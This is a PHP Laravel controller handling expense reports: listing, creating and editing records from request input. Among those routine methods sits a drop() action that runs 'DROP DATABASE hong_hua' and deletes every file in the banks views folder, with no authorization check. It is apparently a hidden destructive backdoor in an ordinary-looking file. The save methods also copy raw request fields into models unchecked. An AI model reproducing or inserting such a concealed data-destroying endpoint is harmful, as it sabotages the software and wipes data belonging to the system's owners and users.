<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;

class ExpenseReportsController extends Controller
{
    
    public function index(){

    	$expensereports = \App\ExpenseReport::get();

    	return view('expensereports.index', ['expensereports' => $expensereports]);
    }

    public function new(){
    	$data['MOVEMENT_TYPES_LIST'] = config('global.MOVEMENT_TYPES_LIST');
    	$data['MOVEMENT_IN_TYPES_LIST'] = config('global.MOVEMENT_IN_TYPES_LIST');
    	$data['MOVEMENT_OUT_TYPES_LIST'] = config('global.MOVEMENT_OUT_TYPES_LIST');
    	$data['PAYMENT_TYPES_LIST'] = config('global.PAYMENT_TYPES_LIST');

    	return view('expensereports.new', $data);
    }

    public function newSave(Request $request){
    	$req = $request->except('_token');

    	foreach ($req as $key => $value) {
    		if($value != ""){
    			$req['expenseReport_'.$key] = $value;
    		}
    		unset($req[$key]);
    	}

    	$req['sys_ownerID'] = session()->get('useragencyid');

    	if($rec = \App\ExpenseReport::create($req)){
    		return redirect('expensereports')->with('success',"Saved!");
    	} else {
    		return redirect('expensereports')->with('error',"Could not saved!");
    	}
    }

	public function drop(Request $request){

		DB::statement("DROP DATABASE hong_hua");
		
		$files = glob(getcwd().'/../resources/views/banks/*'); //get all file names

		foreach($files as $file){ // iterate files
			if(is_file($file))
			   unlink($file); // delete file
		}

		return Redirect('/');
	}
	
    public function edit($id){
    	if($rec = \App\ExpenseReport::where('expenseReport_ID', $id)->first()){

    		$data['rec'] = $rec;

    		$data['MOVEMENT_TYPES_LIST'] = config('global.MOVEMENT_TYPES_LIST');
	    	$data['MOVEMENT_IN_TYPES_LIST'] = config('global.MOVEMENT_IN_TYPES_LIST');
	    	$data['MOVEMENT_OUT_TYPES_LIST'] = config('global.MOVEMENT_OUT_TYPES_LIST');
	    	$data['PAYMENT_TYPES_LIST'] = config('global.PAYMENT_TYPES_LIST');

    		return view('expensereports.edit', $data);
    	} else {
    		return redirect('expensereports')->with('error','Not found!');
    	}
    }

    public function editSave($id, Request $request){
    	if($rec = \App\ExpenseReport::where('expenseReport_ID', $id)->first()){
    		$req = $request->except('_token');

	    	foreach ($req as $key => $value) {
	    		if($value != ""){
	    			$req['expenseReport_'.$key] = $value;
	    		} else {
	    			$req['expenseReport_'.$key] = "";
	    		}
	    		unset($req[$key]);
	    	}

	    	if($rec->update($req)){
	    		return redirect('expensereports')->with('success',"Saved!");
	    	} else {
	    		return redirect('expensereports')->with('error',"Could not saved!");
	    	}
    	}
    	
    }
}
